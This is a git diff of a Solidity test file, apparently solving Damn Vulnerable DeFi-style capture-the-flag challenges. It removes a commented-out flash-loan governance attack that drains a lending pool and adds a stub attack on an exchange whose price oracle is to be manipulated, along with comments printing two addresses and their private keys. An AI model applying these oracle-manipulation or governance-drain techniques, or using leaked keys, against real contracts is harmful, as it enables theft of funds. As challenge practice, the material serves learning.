@@ -34,14 +34,19 @@ contract ProofsOfConcept is Test {
     }
 
     function testAttack() external {
-        // uint256 tokensInPool = _deployer.TOKENS_IN_POOL();
-        // assertEq(_token.balanceOf(_attacker), 0);
-        // assertEq(_token.balanceOf(address(_pool)), tokensInPool);
-        // vm.startPrank(_attacker);
-        // Attack attack = new Attack(_token, _gov, _pool);
-        // attack.attack(tokensInPool);
-        // assertEq(_token.balanceOf(_attacker), tokensInPool);
-        // assertEq(_token.balanceOf(address(_pool)), 0);
+        vm.deal(_attacker, 0.1 ether);
+
+        uint256 initialExchangeEthBalance = _deployer
+            .EXCHANGE_INITIAL_ETH_BALANCE();
+        assertEq(address(_attacker).balance, 0);
+        assertEq(address(_exchange).balance, initialExchangeEthBalance);
+
+        vm.startPrank(_attacker);
+        Attack attack = new Attack(_exchange);
+        attack.attack(initialExchangeEthBalance);
+
+        assertEq(address(_attacker).balance, initialExchangeEthBalance);
+        assertEq(address(_exchange).balance, 0);
     }
 }
 
@@ -98,34 +103,31 @@ contract LoanUser is IERC721Receiver {
 }
 
 contract Attack is Test {
-    // address _owner;
-    // DamnValuableTokenSnapshot private _token;
-    // SelfiePool private _pool;
-    // SimpleGovernance private _gov;
-    // constructor(
-    //     DamnValuableTokenSnapshot token,
-    //     SimpleGovernance gov,
-    //     SelfiePool pool
-    // ) {
-    //     _owner = msg.sender;
-    //     _token = token;
-    //     _gov = gov;
-    //     _pool = pool;
-    // }
-    // function attack(uint256 amount) external {
-    //     require(msg.sender == _owner, "Only _owner can call");
-    //     _pool.flashLoan(amount);
-    //     vm.warp(2 days + 1 seconds);
-    //     _gov.executeAction(1);
-    // }
-    // function receiveTokens(address token, uint256 amount) external {
-    //     _token.snapshot();
-    //     _token.getBalanceAtLastSnapshot(address(this));
-    //     _gov.queueAction(
-    //         address(_pool),
-    //         abi.encodeWithSignature("drainAllFunds(address)", _owner),
-    //         0
-    //     );
-    //     ERC20Snapshot(token).transfer(address(_pool), amount);
-    // }
+    // Match found: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+    // Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+
+    // Match found: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+    // Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+    address _owner;
+
+    address source = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
+
+    Exchange _exchange;
+    constructor(Exchange exchange) {
+        _owner = msg.sender;
+        _exchange = exchange;
+    }
+
+    function attack(uint256 exchangeBalance) external payable {
+        require(msg.sender == _owner, "Only _owner can call");
+        require(msg.value >= 0.1 ether, "Need at least 0.1 ether");
+
+        // get trusted price role
+
+        // set price to 0.1 eth
+        // buy
+
+        // set price to exchangeBalance
+        // sell
+    }
 }
